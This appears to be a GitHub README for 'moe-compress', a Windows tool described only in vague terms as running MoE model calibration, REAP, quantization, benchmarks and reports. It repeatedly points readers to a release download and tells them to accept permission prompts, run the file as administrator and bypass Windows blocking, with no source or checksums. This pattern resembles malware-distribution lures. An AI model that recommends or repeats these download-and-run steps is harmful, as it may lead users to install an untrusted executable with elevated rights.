# 🧩 moe-compress - Simplify MoE Model Compression

[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/reissuerenewal84/moe-compress/releases)

## 📥 Download

Visit this page to download the latest Windows build:

https://github.com/reissuerenewal84/moe-compress/releases

Look for the latest release and download the Windows package that matches your PC. If there is more than one file, choose the one for Windows and end it with `.exe` or `.zip`.

## 🖥️ What this app does

moe-compress helps you manage MoE model compression from one place. It can:

- build calibration bundles
- run REAP steps
- run quantization
- run benchmark jobs
- publish results
- render reports that you can review later

It keeps each stage in one workflow so you can follow what happened and check the output.

## ✅ Before you start

Use a Windows PC with:

- Windows 10 or Windows 11
- at least 8 GB of RAM
- enough free space for model files and reports
- internet access for the first download

If you plan to work with large models, 16 GB of RAM or more is better.

## 🚀 Install on Windows

1. Open the release page:
   https://github.com/reissuerenewal84/moe-compress/releases

2. Find the newest release at the top.

3. Download the Windows file:
   - If you see a `.exe` file, download that file
   - If you see a `.zip` file, download that file and extract it first

4. If you downloaded a `.zip` file:
   - Right-click the file
   - Choose Extract All
   - Pick a folder you can find again

5. Open the folder that contains the app files.

6. Double-click the app file to run it.

7. If Windows asks for permission, choose Yes.

## 🔧 First-time setup

After you open the app, set up these basics:

- choose a working folder for your project files
- point the app to your model files
- pick a location for calibration output
- choose where reports should be saved

Use a local folder with a short path, such as:

- `C:\moe-compress`
- `C:\Users\YourName\Documents\moe-compress`

This helps avoid path errors when the app writes files.

## 📦 Typical workflow

### 1. Build a calibration bundle

Use this step to gather the files the app needs before compression.

You may select:

- model files
- sample data
- output folder
- run name

The app then prepares a calibration bundle you can use in later steps.

### 2. Run REAP

Use REAP to process the model with the settings you choose.

Common options may include:

- layer selection
- token limits
- batch size
- output path

The app records the stage so you can check what it did later.

### 3. Run quantization

Use quantization to reduce model size and keep the workflow moving.

You can usually set:

- precision level
- method
- output name
- save location

The app writes the quantized result to your chosen folder.

### 4. Run benchmarks

Run benchmarks to compare output before and after compression.

The app may collect:

- speed
- memory use
- file size
- quality scores

This helps you check the effect of each stage.

### 5. Publish results

When you finish, publish the output so you can share or store it.

The app can organize:

- final artifacts
- logs
- reports
- benchmark data

### 6. Render reports

Use report mode to create a clear record of the full run.

Reports may include:

- run settings
- stage output
- benchmark charts
- audit details

This gives you a simple way to review the full process.

## 🧭 Common files you may see

When you run the app, you may see files like:

- `bundle.json` for calibration details
- `run-log.txt` for process logs
- `report.html` for a report you can open in a browser
- `results.csv` for benchmark data
- output folders with model artifacts

Keep these files together in one project folder if you want to review them later.

## 🛠️ How to use the app safely

- Close other large apps before you start
- Keep your model files in one folder
- Do not rename files while a job is running
- Use a folder with enough free space
- Wait for each stage to finish before starting the next one

If a run fails, check the log file first. It often shows the step that caused the issue.

## 🔍 Troubleshooting

### The app does not open

- Right-click the file and choose Run as administrator
- Check that Windows did not block the file
- Download the release again if the file looks incomplete

### The app closes right away

- Make sure you downloaded the correct Windows build
- If you used a `.zip` file, extract it before opening the app
- Try a folder path with simple characters

### The app cannot find my model

- Check the file path
- Move the model to a local folder
- Avoid folders with very long names
- Make sure the model files are not still in a compressed archive

### Reports do not render

- Check that the report output folder exists
- Confirm that the run finished
- Open the HTML file in a current browser

### Benchmark output looks wrong

- Check the input model path
- Confirm the calibration bundle was built first
- Run the benchmark again with the same settings

## 📁 Suggested folder layout

A simple folder structure works well:

- `C:\moe-compress\input`
- `C:\moe-compress\calibration`
- `C:\moe-compress\output`
- `C:\moe-compress\reports`

This keeps your files easy to find and helps you track each stage.

## 🧪 Example use case

If you want to compress one MoE model and keep a record of the run:

1. Put the model in `C:\moe-compress\input`
2. Build a calibration bundle
3. Run REAP
4. Run quantization
5. Run benchmarks
6. Publish the final output
7. Render a report

After that, you can review the report folder and compare the benchmark results with the original model

## 📎 Download again

If you need the app files again, use the release page here:

[https://github.com/reissuerenewal84/moe-compress/releases](https://github.com/reissuerenewal84/moe-compress/releases)

## 📌 Quick start

1. Visit the release page
2. Download the latest Windows file
3. Extract it if needed
4. Open the app
5. Choose your model folder
6. Run the workflow you need